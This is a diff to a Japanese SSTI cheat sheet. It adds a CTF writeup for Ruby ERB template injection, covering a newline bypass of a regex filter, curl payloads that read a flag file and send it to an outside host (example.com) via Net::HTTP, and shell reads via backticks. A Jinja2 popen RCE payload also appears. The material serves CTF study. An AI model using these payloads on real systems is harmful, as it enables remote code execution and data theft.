@@ -31,12 +31,6 @@
       - [dust](#dust)
       - [marko](#marko)
       - [ejs](#ejs)
-- [writeup](#writeup)
-  - [sample](#sample)
-  - [sample](#sample-1)
-  - [sample](#sample-2)
-  - [sample](#sample-3)
-  - [sample](#sample-4)
 - [メモ](#%E3%83%A1%E3%83%A2)
 - [参考](#%E5%8F%82%E8%80%83)
 
@@ -970,7 +964,7 @@ ugOlkb8cWen3RKy5jmT3DZoF7bWwJ5Oauid=0(root) gid=0(root) groups=0(root)
 UqfIaDZlPpRDsVBvEz04ssis4YEBwPkl
 ```
 # writeup
-## sample
+## jinja2 render_template_string (ISC BugHunt101 CTF 2020)
 https://caya8.hatenablog.com/entry/2020/07/16/083000   
 - **entrypoint**    
 Flaskのencode,decodeをするWebページがある。encode,decodeにはPOSTで`mode=encode`みたいに指定するが、encodeもdecodeも指定しない場合はエラーページを入力を含めて返す。ここのJinja2の`render_template_string`にSSTIがある。   
@@ -997,11 +991,44 @@ $ bash runInDocker.sh 0.0.0.0
 ![image](https://user-images.githubusercontent.com/56021519/102914001-fc2bb880-44c2-11eb-8303-5cd2b4ca0641.png)   
 `<pre>{{config.__class__.__init__.__globals__['os'].popen('id').read()}}<!--`として`<pre>`を先頭につけて、末尾に`<!--`を付けると出力が綺麗になる。   
 ![image](https://user-images.githubusercontent.com/56021519/102914209-46149e80-44c3-11eb-892b-36ef254f6cff.png)   
-## sample
+## erb / bypass 正規表現 "^" "$" (harkaze ctf 2017)
+https://st98.github.io/diary/posts/2017-12-08-harekaze-ssti-problem.html   
 - **entrypoint**    
+`params[:memo]`の値が`erb`のテンプレートエンジンに入力されてる。Rubyで入力を`/^[0-9A-Za-z]+$/`で正規表現で数字とアルファベットだけに制限してるが、Rubyでの`^`,`$`は脆弱だから使わない方がいい。これは改行文字を入れることで簡単にBypassできるのでここがentrypoint   
 - **概要**    
-- **Payload**    
+ソースは以下の通り。   
+```rb
+def is_valid(s)
+  return /^[0-9A-Za-z]+$/ =~ s
+end
 
+post '/add' do
+  unless session[:memos]
+    session[:memos] = []
+  end
+  unless is_valid(params[:memo])
+    redirect to('/')
+  end
+  session[:memos].push params[:memo]
+  // ここが脆弱！
+  logger.info erb("memo ('#{params[:memo]}') added", :layout => false)
+  redirect to('/')
+end
+```
+Rubyの正規表現の危険性は以下を参照。   
+https://blog.tokumaru.org/2014/03/z.html   
+`memo=1%0Apwned!`みたいにすると以下のようになり、`!`を挿入できる！   
+```txt
+memo=1
+pwned!
+```
+- **Payload**    
+`require 'net/http'; Net::HTTP.get_print 'example.com', File.read('flag'), 8000`でFlagの中身を表示できるらしい。   
+```txt
+curl -v http://192.168.99.100:4567/add -d "memo=1%0A%3C%25%3D%20require%20'net%2Fhttp'%3B%20Net%3A%3AHTTP.get_print%20'example.com'%2C%20File.read('flag')%2C%208000%20%25%3E"
+```
+他にも、``<% abort `cat flag` %>``としてabortに引数として文字列を与えると、それをエラーメッセージとして表示するらしい。   
+また、``<% session[:memos].push `cat flag` %>``でセッションにflagを保存することもできるらしい。   
 ## sample
 - **entrypoint**    
 - **概要**    
